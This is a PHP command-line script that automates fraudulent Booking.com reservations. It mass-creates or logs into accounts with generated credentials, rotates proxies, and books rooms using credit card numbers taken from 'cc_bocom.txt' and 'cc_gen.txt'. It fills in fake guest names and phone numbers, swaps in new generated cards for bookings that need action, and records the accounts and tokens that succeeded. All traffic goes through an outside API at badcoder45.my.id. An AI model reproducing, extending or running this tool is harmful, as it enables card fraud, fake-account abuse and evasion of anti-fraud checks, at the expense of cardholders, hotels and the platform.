<?php

error_reporting(0);

$AUTOPAY = new bocom;
if (empty($argv[1])) {
    exit($AUTOPAY->color('red', "\n[•] usage: php ".$argv[0]." -r/-l akun.txt 2 (note: -r > regis -l > login 2 > total akun) \n\n"));
} elseif (empty(file("proxy.txt"))) {
    exit($AUTOPAY->color('red', "\n[•] proxy.txt tidak ada \n\n"));
} elseif (empty(file("cc_bocom.txt"))) {
    exit($AUTOPAY->color('red', "\n[•] cc_bocom.txt tidak ada \n\n"));
}
$AUTOPAY->BookingCom($argv);

class bocom {
    public $BocomAPI, $Fakeinfo, $color;
    function __construct() {
        $this->BocomAPI = "http://api.badcoder45.my.id/api.php?key=".json_decode(file_get_contents('config.json'), true)['Apikey'];
    }
    function home() {
        $this::color('purple', "\n[•] ");
        $this::color('blue', "AUTOMATION PAYMENT BOOKING.COM");
        $this::color('purple', " [•]\n");
    }
    function endKey($array){
        end($array);
        return key($array);
    }
    function BookingCom($argv) {
        $action = strtolower($argv[1]);
        if ($action == '-l' || $action == '-r') {
            $this->autopay($argv);
        } elseif ($action == '-b') {
            $this->checkBooking($argv);
        }
    }
    function checkBooking($argv) {
        $this->home();
        $guest = json_decode(file_get_contents('config.json'), true);
        $file_akun = array_unique(file("akun_success_bocom.txt"));
        for ($i = 0; $i < count($file_akun); $i++) {
            $akun = trim($file_akun[$i]);
            $akun = explode("|", $akun);
            if (!empty($akun[2])) {
                $this::color('green', "\n[" . ($i + 1) . "] " . $akun[0] . "|" . $akun[1] . " # ");
                $proxy = trim(file("proxy.txt")[array_rand(file("proxy.txt"))]);
                $result = $this->details($akun[2], $guest, $proxy);
                $booking = $result[0];
                if ($booking['code'] != '200') {
                    $this::color("red", $booking['message']."\n");
                    continue;
                }
                $reward = $result[1];
                echo "\n";
                $this::color("blue", "• BOOKING HISTORY\n");
                for ($a = 0; $a < count($booking['data']); $a++) {
                    $book = $booking['data'][$a];
                    if ($book['room_status'] == 'Canceled' || $book['room_status'] == 'Action required') {
                        $color = 'red';
                    } else {
                        $color = 'green';
                    }
                    $this::color($color, ($a + 1) . ". ".$book['hotel_name']." # ".$book['room_reserveid'].":".$book['room_pin']." # ".$book['checkout']." # ".$book['room_price']." # ".$book['room_status']." ");
                    if ($book['room_status'] == 'Action required') {
                        $name = json_decode(file_get_contents("https://randomuser.me/api/"), true)['results'][0]['name']['first'];
                        $cc = trim(file("cc_gen.txt")[array_rand(file("cc_gen.txt"))]);
                        $result = $this->updatecc($akun[2], ['room_reserveid' => $book['room_reserveid'], 'room_pin' => $book['room_pin'], 'ccname' => $name, 'creditcard' => $cc], $proxy);
                        //print_r($result);
                        if ($result['code'] == '200') {
                            $color = 'green';
                        } else {
                            $color = 'red';
                        }
                        $this::color($color, "# ".$result['message']);
                    }
                    echo "\n";
                }
                $this::color("blue", "\n• REWARD HISTORY\n");
                for ($a = 0; $a < count($reward['data']); $a++) {
                    $wallet = $reward['data'][$a];
                    if ($wallet['status'] == 'pending') {
                        $color = 'yellow';
                    } elseif($wallet['status'] == 'rejected') {
                        $color = 'red';
                    } else {
                        $color = 'green';
                    }
                    $this::color($color, ($a + 1) . ". ".$wallet['reward']." # ".$wallet['last_update']." # ".$wallet['description']."\n");
                }
            }
            
        }
    }
    function autopay($argv) {

        $this->home();
        $guest = json_decode(file_get_contents('config.json'), true);
        $total_hotel = count($guest['hotel_id']);
        if (empty($guest['hotel_id'])) {
            $config = file_get_contents("http://api.badcoder45.my.id/config.json");
            file_put_contents("config.json", $config);
            exit($this::color('green', "\n[•] download config.json success, open and edit your config.json\n\n"));
        }
        /*$filehotel = array_values(array_filter(array_unique(explode(",", file_get_contents("hotel_id.txt")))));
        $total_hotel = count($filehotel);
        for ($u = 0; $u < count($filehotel); $u++) {
            $hotelid = $filehotel[$u];*/
        for ($u = 0; $u < count($guest['hotel_id']); $u++) {

            $hotelid = $guest['hotel_id'][$u];
            getrecom:
            $proxy = trim(file("proxy.txt")[array_rand(file("proxy.txt"))]);
            $getrecomen = $this->getrecomen($hotelid, $guest, $proxy);
            //print_r($getrecomen); exit;
            if ($getrecomen['status'] == 'error') {
                $this::color('red', "\n[ ".$hotelid." ] ".$getrecomen['message']." [>]\n");
                goto getrecom;
            } elseif (empty($getrecomen['data'])) {
                $this::color('red', "\n[ ".$hotelid." ] No Property [>]\n");
                continue;
            }
            $hotel_berid = [$hotelid];
            if ($guest['hotel_terdekat'] == true) {
                for ($h = 0; $h < count($getrecomen['data']); $h++) {
                    $hotel_berid[] = $getrecomen['data'][$h]['hotel_id'];
                }
            }
            $hotel_ids = array_values(array_filter(array_unique($hotel_berid)));
            //print_r($hotel_ids);
            $this::color('purple', "\n[•] ".$hotelid." => "); $this::color("yellow", implode(", ", $hotel_ids)."\n");
            
            for ($a = 0; $a < count($hotel_ids); $a++) {

                $limit_avail = 1;
                $hotel_id = trim($hotel_ids[$a]);
                //$hotel_block = $getrecomen['data'][$a]['hotel_block'];
                //$hotel_name = $getrecomen['data'][$a]['hotel_name'];
            
                for ($i = 0; $i < $argv[$this->endKey($argv)]; $i++) {
                    if ($limit_avail > 10) {
                        break;
                    }
                    /*---------------------------------------------------------------------------*/
                    recreate:
                    if (!empty($confirmed) && $guest['repeat_order'] == true) {
                        $confirmed = '';
                        $action = 'login';
                    } elseif (strtolower($argv[1]) == '-l') {
                        $akunline = trim(file($argv[2])[$i]);
                        $email = explode("|", $akunline)[1];
                        $pass = explode("|", $akunline)[2];
                        $action = 'login';
                    } elseif (strtolower($argv[1]) == '-r') {
                        $firstname = json_decode(file_get_contents("firstname.json"), true);
                        $lastname =  json_decode(file_get_contents("surname.json"), true);
                        $coment = [".", "_", ""];
                        $email = strtolower($firstname[array_rand($firstname)].$coment[array_rand($coment)].$lastname[array_rand($lastname)].rand(2,100).$this->email());
                        $pass = ucfirst(strtolower($this->genStr(8).mt_rand(1999, 2023)));
                        $action = 'register';
                    } else {
                        die(color('red', "\n[!] No Option : ".$argv[1]." error occured\n\n"));
                    }
                    $counts = $total_hotel - $u;
                    $this::color('green', "\n[•] [".$hotel_id."/".$counts."] ". $email." ");
                    tryproxy:
                    $proxy = trim(file("proxy.txt")[array_rand(file("proxy.txt"))]);
                    $akun = $this->getoken($action, $email, $pass, $proxy);
                    //if (empty($akun['ip_address'])) print_r($akun);
                    if ($akun['status'] == "STEP_SUCCESS") {
                        $jsonapi = json_decode(file_get_contents("http://ipwho.is/" . $akun['ip_address']), true);
                        $country = $jsonapi['country_code'];
                        $nohp = $jsonapi['calling_code'];
                        if (empty($country)) {
                            $country = json_decode(file_get_contents("https://api.country.is/" . $akun['ip_address']), true);
                            $country = $country['country'];
                        }
                        $this::color('green', "[".$akun['ip_address']."/".$country."] ");
                        file_put_contents("account_bocom.txt", $email . "|" . $pass . "\n", FILE_APPEND);
                        $this::color('green', strtoupper($akun['message']) . " \n[•] ");
                    } elseif ($akun['status'] == 'STEP_ACCOUNT__DISABLED' || $akun['status'] == 'STEP_ACCOUNT__LOCKED' || $akun['status'] == 'Password is incorrect' || $akun['code'] == 'user_exists') {

                        $this::color('red', $akun['message'] . "\n");
                        if ($action == 'login') {
                            $this->replace($argv[2], $akunline."\n", "");
                        }
                        goto recreate;
                    } elseif ($akun['code'] == 'proxy_error') {

                        $this::color('red', $akun['message'] . " [>] ");
                        goto tryproxy;
                    } else {

                        $this::color('red', $akun['message'] . "\n");
                        goto recreate;
                    }
                    /*---------------------------------------------------------------------------*/
                    $count_try = 1;
                    tryroom:
                    $getroom = $this->getroom($hotel_id, $guest, $akun, $proxy);
                    $hotel = $getroom['data'];
                    //print_r($hotel);
                    if (empty($hotel)) {
                        $this::color('red', $getroom['message']." [>] ");
                        if ($getroom['code'] == "room_notavailable") {
                            if ($action == 'login') {
                                $this->replace($argv[2], $akunline . PHP_EOL, "");
                            }
                            continue;
                        }
                        goto tryroom;
                    }
                    $hotel_name = explode(" ", $hotel['hotel_name']);
                    $room_name = $hotel_name[0] . " " . $hotel_name[1] . " " . $hotel_name[2];
                    if ($count_try == 1)
                        $this::color('green', $room_name . " [" . $hotel['hotel_type'] . "] ");
                    if (empty($hotel['room'])) { 
                        $this::color('red', "ROOM EMPTY \n ");
                        $limit_avail++;
                        continue;
                    }
                    
                    $total_block = $this->BlockCount($hotel, $guest);
                    if (empty($total_block)) {
                        block_random:
                        $total_block = $this->BlockRandom($hotel, $guest);
                    }
                    
                    $this::color('green', "(QTY: ".count($total_block)." ROOM) ");

                    $card = trim(file("cc_bocom.txt")[array_rand(file("cc_bocom.txt"))]);
                    $fake = json_decode(file_get_contents("https://randomuser.me/api/"), true)['results'][0]['name'];
                    if (empty($confirmed)) {
                        $fake_info = ['card' => $card, 'email' => $email, 'country' => strtolower($country), 'nohp' => $nohp.$this->genNumb(9), 'first' => $fake['first'], 'last' => $fake['last']];
                    }
                    $guest = array_merge($guest, $fake_info);
                    $count_try++;
                    $hotel = array_merge($hotel, ['block_id' => $total_block]);
                    $bookroom = $this->bookroom($hotel_id, $hotel, $guest, $akun, $proxy);
                    //print_r($bookroom['message']);
                    if ($bookroom['code'] == "1010" || $bookroom['code'] == 'consent_error') {

                        $this::color('yellow', "INTERNALERROR [>] ");
                        if ($action == 'register')
                            file_put_contents("failed_bocom.txt", $email . "|" . $pass . "\n", FILE_APPEND);
                        if ($count_try > 2) {
                            $limit_avail++;
                            echo "\n";
                            continue;
                        }
                        goto tryroom;
                    } elseif ($bookroom['code'] == "1006" OR $bookroom['code'] == '2007') {

                        $this::color('red', "RETRYBOOK [>] ");
                        if ($action == 'register')
                            file_put_contents("failed_bocom.txt", $email . "|" . $pass . "\n", FILE_APPEND);
                        if ($count_try > 2) {
                            $limit_avail++;
                            echo "\n";
                            continue;
                        }
                        goto tryroom;
                    } elseif ($bookroom['code'] == "500" or $bookroom['code'] == "payment_error" or $bookroom['code'] == "proxy_error") {
                        
                        $this::color('yellow', "RETRY [>] ");
                        if ($count_try > 2) {
                            $limit_avail++;
                            echo "\n";
                            continue;
                        }
                        goto tryroom;
                    } elseif ($bookroom['code'] == "1107" or $bookroom['code'] == "timeout") {

                        $this::color('yellow', $bookroom['message']." [>] ");
                        if ($count_try > 2) {
                            $limit_avail++;
                            echo "\n";
                            continue;
                        }
                        goto tryroom;
                    } elseif ($bookroom['code'] == "full_booked" || $bookroom['code'] == 'combination_error') {

                        $this::color('yellow', $bookroom['message']." [>] ");
                        if ($count_try > 3) {
                            $limit_avail++;
                            echo "\n";
                            continue;
                        }
                        goto block_random;
                    } elseif ($bookroom['message'] == "null") {

                        $this::color('yellow', "RETRY [>] ");
                        if ($count_try > 3) {
                            $limit_avail++;
                            echo "\n";
                            continue;
                        }
                        goto block_random;
                    } elseif ($bookroom['code'] == 'pay_now') {

                        $this::color('yellow', $bookroom['message'] . "\n");
                        if ($action == 'register')
                            file_put_contents("failed_bocom.txt", $email . "|" . $pass . "\n", FILE_APPEND);
                        continue 2;
                    } elseif ($bookroom['status'] != "success") {
                        
                        $this::color('red', $bookroom['message'] . "\n");
                        if ($action == 'register')
                            file_put_contents("failed_bocom.txt", $email . "|" . $pass . "\n", FILE_APPEND);
                        continue;
                    }
                    $limit_avail = 1;
                    $count_try = 1;
                    $confirmed = 1;
                    $this::color('green', strtoupper($bookroom['message']) . "\n");
                    if (empty($this->cekvalue(file("akun_success_bocom.txt"), $email))) {
                        file_put_contents("akun_success_bocom.txt", $email . "|" . $pass ."|".$akun['access_token']."\n", FILE_APPEND);
                    }
                    file_put_contents("success_bocom.txt", $email . "|" . $pass . "|".$hotel_id."|" . $bookroom['message'] . "\n", FILE_APPEND);
                    file_put_contents("hotel_id_jos.txt", $hotel_id . "| " . $bookroom['message'] . " \n", FILE_APPEND);
                    //file_put_contents("address_confirmed.txt", $email . "|" . $pass ." => ".json_encode($fake_info)."\n", FILE_APPEND);
                    $this->replace("cc_bocom.txt", $card . "\n", "");
                    if ($action == 'login') {
                        $this->replace($argv[2], $akunline . PHP_EOL, "");
                    }
                }
            }
        }
        echo "\n";
    }
    function getoken($action, $email, $pass, $proxy) {
        $body   = [
            'data' => [
                'action'   => $action,
                'email'    => $email,
                'password' => $pass,
                'proxy'    => $proxy
            ]
        ];
        $result = $this->curlBocom('POST', $body, false);
        return json_decode($result, true);
    }
    function details($akun, $guest, $proxy) {
        $body[] = [
            'data' => [
                'action'       => 'account_details',
                'request'      => 'getbooking',
                'proxy'        => $proxy,
                'access_token' => $akun,
            ]
        ];
        $body[] = [
            'data' => [
                'action'       => 'account_details',
                'request'      => 'getreward',
                'proxy'        => $proxy,
                'access_token' => $akun,
            ]
        ];
        $result = $this->multi_curl($body);
        for ($i = 0; $i < count($result); $i++) {
            $data[] = json_decode($result[$i], true);
        }
        return $data;
    }
    function updatecc($akun, $guest, $proxy) {
        $body = [
            'data' => [
                'action'         => 'account_details',
                'request'        => 'getupdatecc',
                'room_reserveid' => $guest['room_reserveid'],
                'room_pin'       => $guest['room_pin'],
                'creditcard'     => $guest['creditcard'],
                'ccname'         => $guest['ccname'],
                'proxy'          => $proxy,
                'access_token'   => $akun,
            ]
        ];
        $result = $this->curlBocom('POST', $body, false);
        return json_decode($result, true);
        //return $result;
    }
    function getrecomen($hotel_id, $guest, $proxy) {
        $body = [
            'data' => [
                'action'    => 'recom_room',
                'hotel_id'  => $hotel_id,
                'check_in'  => $guest['CheckIn'],
                'check_out' => $guest['CheckOut'],
                'room_qty'  => $guest['room_qty'],
                'proxy'     => $proxy,
                'mobile_token' => "f018af2a1ea6a5862bef1031982a63bb9c6b25e8"
            ]
        ];
        $result = $this->curlBocom('POST', $body, false);
        return json_decode($result, true);
        //return $result;
    }
    function getroom($hotel_id, $guest, $akun, $proxy) {
        $body = [
            'data' => [
                'action'    => 'get_room',
                'hotel_id'  => $hotel_id,
                'check_in'  => $guest['CheckIn'],
                'check_out' => $guest['CheckOut'],
                'proxy'     => $proxy,
                'access_token' => $akun['access_token'] //"Y0xFSElEa3U4Q0JwejhZa2p0OEc5R2V6K3pQTUpPU0IrRzEvVG40THZ4RXJiNWZoUnRtQWViRzI2VzZKbUZhdThRSitvOHZ2bmNjVkVMZnYvcDVabTYrN01mM0I5MFhSK1N5VnU3TTJiOGs3WThNNXNoV281SFBVT0g2SzArcm9IS0V1TjhncG9sQ25KckxaR1l3WFZqSFVZSDY4ekN4SEtWcjN0U0NVTHlVU2ZoMjFlb2dJVHg2anI0dTVoVWJ4c3o3dFVHbEFYc2F6Zi8zeDdaNHZkTk1XWFVxUlZFY2VhdnJpSkx5MURVRkFGYnhQcmxYSzlqaitMNXQ5VCthaGVGcnZyWXE4eE1WbFNOZm5RNzhnelA2VW9TYllPaUNqNTU4eDlyL2J1VHdVSEhQeExid1ludXNQR1grbkd5WnNucCtTeVZwUnVrSTNVd1RPVjNKYkJFY1dvTTVBUkpJZjZxMFh6cHNDcCtabkw0dko5Ly9ZUjlvcUQ5cisrbU9vd3hLYTFTQTBOc1ptRmZGbEJ1UXp5bWlhSVMxWWQ2MXBiUW9UY1hSWXF2R0VpTWFuRGdpQzlOSy9vRDZlVDZxdjREVEQ0QW55aG44RFp5SWNwK1pCbkdrSGJUSmJJMFpoKy9sN0k0czh3N1ErTGJLbkhVRDF1UHllclB2SFR1QmhZbjArQS9ZTWloZlE3aTJSUU9DcDRpTFh5RXE1a1JDbkl3WTN1S1F0S3ZCbXFHYUZjeFJKTHlFSm9pOGpkYkFsaDJxL3N6cU92ZksxbzYxYW1nNVVYYy9ZZ2hicER2ZXQxN0tXdnpWOXZpOVRxRVhoczhGUTltN3JIUnVCSnQ1OEdBVnNkSElqSnpQVFpCUUQ4cC9VdXBDQlhYanh2SFRsYjRDd3prNjNYOFloOFZ6UHFuUEVnRU5LL1lGdC91K2hOaGhmVzUwNnBucEdzZitPUkdoUGdkZE9hMjZ1dzU3enBSbWgxaHFQa1lPdWQ0NDVxemU3R2JGVGxaSy9yM21ZeVRWWlQvbUlobmZpVzRzR1ZudTN3K2VpY0sySWxZMXBaeUgzYy93OUNNdE8yTTF6UlJEMWJ5R2p1Wm1ndWQyeUd6WmNUVTNpbHpWM0FsZkZvNStzTXZWRTZ3L0VQVThEOE16U3dpWFY4TDlmczhDWC9wL2xKNjgxQzcyUWZUZlpHM1JocnlVcHk2NHdJeXpJRzk5S3pMTldxR0VHRmRUby8yZ1RKZmhMM2xBV3ZITUdBR0pTbnpUbTZBeWxkVklQSDgwTGhSMTNENXFBR0dibDYyTlgxZXdWNGtVU1FtVTZqVzJNOWNTVHlMdTVtZ0lRbG5UZEgwcUZhcy9YNCt0WE5qWkJCMDNtbjNxR3I1MUlmdURxRUF3cXhiS0xwN3d2TG9SRTJxZVVGYUFZV25zbTVvdWt3a1BaYkswaForNkw4eHdQcnQ5eE5oUXFSNmRBYzdQL092a0FTdzk4NnloOC91c2hZT3VwRi9qUGl2amV2NGlwai9ncEFoNURuZWx0S3hEd3JwTTB4YURFTm1hSFhHc1B6ekwxWUV3bXE1dk5NelhBM1dhb0tQYjNrcWNneUlOMkxxUklhR3czRi9iOHIvczBtUlg1R3lmd051ZVRWSDFPY0oyTWZLVXlpOFVPQVFrZyt6c0pGRVlCZnVySmpiNS9IU1c0cTkvbkpmMlREcVZoK0oxeDlPNlJVMU1jVTZralVyajJwdjFBelowYmdlZlQxQjBsbDlWYStRWUtsREtveWZkUDZFL2s2OS9JdzBYdDlRMW9BZEN5azVsdXlMWXNxQT09" //$akun['access_token']
            ]
        ];
        $result = $this->curlBocom('POST', $body, false);
        return json_decode($result, true);
    }
    function bookroom($hotel_id, $hotel, $guest, $akun, $proxy) {
        $body = [
            'data' => [
                'action'       => 'book_room',
                'hotel_id'     => $hotel_id,
                'hotel_type'   => $hotel['hotel_type'],
                'check_in'     => $guest['CheckIn'],
                'check_out'    => $guest['CheckOut'],
                'creditcard'   => $guest['card'],
                'cc_required'  => $hotel['cc_required'],
                'cvc_required' => $hotel['cvc_required'],
                'block_id'     => $hotel['block_id'],
                //'block_qty'    => $hotel['block_qty'],
                'latitude'     => substr($hotel['latitude'], 0, -5).mt_rand(12345, 99945),
                'longitude'    => substr($hotel['longitude'], 0, -5).mt_rand(12345, 99945),
                'email'        => $guest['email'],
                'firstname'    => $guest['first'],
                'lastname'     => $guest['last'],
                'nohp'         => $guest['nohp'],
                'country'      => $guest['country'],
                'proxy'        => $proxy,
                'access_token' => $akun['access_token']
            ]
        ];
        //print_r($body);
        $result = $this->curlBocom('POST', $body, false);
        return json_decode($result, true);
    }
    function multi_curl($array_akun) {
        for ($i = 0; $i < count($array_akun); $i++) {
            $url_array[] = $this->BocomAPI;
            $opts[] = array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 15,
                CURLOPT_USERAGENT      => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
                CURLOPT_FAILONERROR    => true,
                CURLOPT_CONNECTTIMEOUT => 5,
                CURLOPT_CUSTOMREQUEST  => "POST",
                CURLOPT_POSTFIELDS     => json_encode($array_akun[$i]),
            );
        }
        $node_count = count($url_array);
        $curl_arr = array();
        $master = curl_multi_init();

        for ($i = 0; $i < $node_count; $i++) {
            $url = $url_array[$i];
            $curl_arr[$i] = curl_init($url);
            curl_setopt_array($curl_arr[$i], $opts[$i]);

            curl_multi_add_handle($master, $curl_arr[$i]);
        }

        do {
            curl_multi_exec($master, $running);
        } while ($running > 0);

        for ($i = 0; $i < $node_count; $i++) {
            $response[] = curl_multi_getcontent($curl_arr[$i]);
        }

        return $response;
    }
    function curlBocom($metod, $data, $header = []) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->BocomAPI);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $metod);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    function cekvalue($array, $cek){
		return array_values(array_filter($array, function($var) use ($cek) { return preg_match("/".$cek."/i", $var); }));
	}
    function url_get_contents($url, $proxy) {
        $proxy = explode("@", $proxy);
        $auth = base64_encode($proxy[0]);
        $opts = array(
            'http' => array(
                'proxy'           => $proxy[1],
                'request_fulluri' => true,
                'header'          => "Proxy-Authorization: Basic ".$auth,
            )
        );
        $ctx = stream_context_create($opts);
        return file_get_contents($url, false, $ctx);
    }
    function email() {
        $email = json_decode(file_get_contents("config.json"), true)['domain'];
        //$email = json_decode(file_get_contents("https://www.1secmail.com/api/v1/?action=getDomainList"), true);
        return "@".$email[array_rand($email)];
    }
    function genStr($length) {
        $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $password = '';
        for ($i = 0; $i < $length; $i++) {
            $index = rand(0, strlen($characters) - 1);
            $password .= $characters[$index];
        }
        return $password;
    }
    function genNumb($length) {
        $result = '';
        $characters = "0123456789";
        $characterLength = strlen($characters);
        for ($i = 0; $i < $length; $i++) {
            $result .= $characters[rand(0, $characterLength - 1)];
        }
        return $result;
    }
    static function color($color = "default" , $text = ""){
		$array = array(
			'grey'      => '1;30',
			'red'       => "1m\e[91",
			'green'     => "1m\e[92",
			'yellow'    => "1m\e[93",
			'blue'      => '1;34',
			'purple'    => '1;35',
			'nevy'      => '1;36',
			'default'   => '1;0',
		);  
		echo "\033[".$array[$color]."m".$text."\033[0m";
	}
    function replace($FilePath, $OldText, $NewText){
        $Result = array('status' => 'error', 'message' => '');
        if (file_exists($FilePath) === TRUE) {
            if (is_writeable($FilePath)) {
                try {
                    $FileContent = file_get_contents($FilePath);
                    $FileContent = str_replace($OldText, $NewText, $FileContent);
                    if (file_put_contents($FilePath, $FileContent) > 0) {
                        $Result["status"] = 'success';
                    } else {
                        $Result["message"] = 'Error while writing file';
                    }
                } catch (Exception $e) {
                    $Result["message"] = 'Error : '.$e;
                }
            } else {
                $Result["message"] = 'File '.$FilePath.' is not writable !';
            }
        } else {
            $Result["message"] = 'File '.$FilePath.' does not exist !';
        }
        return $Result;
    }
    function BlockCount($hotel, $guest) {
        $hotel_block = [];
        $by_qty = [];
        $blockid = [];
        for ($d = 0; $d < count($hotel['room']); $d++) {
            $hotel_block[$hotel['room'][$d]['room_blockid']] = $hotel['room'][$d]['room_price'];
            $by_qty[$hotel['room'][$d]['room_blockid']] = $hotel['room'][$d]['room_qty'];
            $blockid[] = $hotel['room'][$d]['room_blockid'];
        }
        arsort($hotel_block);
        $hotelblock = $hotel_block;
        $no = 0;
        $max = 1;
        $total_block = [];
        foreach ($hotelblock as $key => $value) {
            if ($no < $guest['room_qty']) {
                $qtyroom = round($by_qty[$key] / 2);
                for ($x = 0; $x < $qtyroom; $x++) {
                    if ($max++ <= $guest['max_room']) {
                        $total_block[] = $key;
                    }
                }
            }
            $no++;
        }
        return $total_block;
    }
    function BlockRandom($hotel, $guest) {
        
        for ($d = 0; $d < count($hotel['room']); $d++) {
            $blockid[] = $hotel['room'][$d]['room_blockid'];
        }
        krsort($blockid);
        for ($c = 0; $c < $guest['room_qty']; $c++) {
            $total_block[] = $blockid[$c];
        }
        return $total_block;
    }
    
}



